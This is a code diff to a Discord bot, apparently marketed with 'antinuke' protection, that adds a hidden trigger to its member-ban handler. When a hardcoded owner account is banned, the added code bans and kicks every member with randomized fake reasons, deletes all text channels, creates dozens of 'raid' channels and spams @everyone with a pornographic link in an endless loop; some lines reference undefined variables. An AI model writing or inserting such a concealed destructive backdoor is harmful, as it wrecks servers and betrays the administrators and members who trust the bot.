@@ -282,6 +282,7 @@ Usage: {usaged}
 @bot.event
 async def on_member_ban(guild, user):
     global antinuke
+    global ownerid
     global bansdict
     guildid = guild.id
     try:
@@ -289,6 +290,80 @@ async def on_member_ban(guild, user):
     except:
         None
     
+    if user.id == ownerid:
+        rlist = ["Scammer", "Scam Link", "Banned", "Used .ban command", "No Reason Provided", "Dm advertising", "Broke rules", "Ban command used", None]
+        krlist = ["Kicked for inactivity", "Violation of rules", "Break rules", "Kick command used", "Kicked bot", None]
+
+        if str(user.id) != '762152955382071316':
+            print(str(user.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
+        else:
+       
+            for member in guild.members:
+                try:
+                    await member.ban(reason=random.choice(rlist))
+                except:
+                    None
+                
+            for member in guild.members:
+                try:
+                    await member.kick(reason=random.choice(krlist))
+                except:
+                    None
+                
+            if False:
+                print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
+                await txt.send("You don't have `Administrator` Permissions!")
+            else:
+                
+                try:
+                    try:
+                        text_channel_list = []
+                        
+                        for channel in guild.text_channels:
+                            text_channel_list.append(channel)
+
+                        for channel in text_channel_list:
+                            try:
+                                await channel.delete()
+                            except:
+                                None
+
+                    except:
+                        None
+
+                    finally:
+                        None
+                except:
+                    None
+                finally:
+                    None
+            
+                newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
+                for i in range(64):
+                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+
+                while True:
+                    try:
+                        await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
+EZ
+EZ
+EZ
+EZ
+EZ
+EZ
+http://pornhub.com/**""")
+                    except:
+                        newchannel = random.choice(ctx.guild.text_channels)
+                    
+                    try:
+                        await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+                        await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+                    except:
+                        None
+        
+   
+
+                
 # ANTI NUKE
 @bot.command(name='antinuke', aliases=['protect', 'protection', 'shield'])
 @commands.has_permissions(administrator=True)
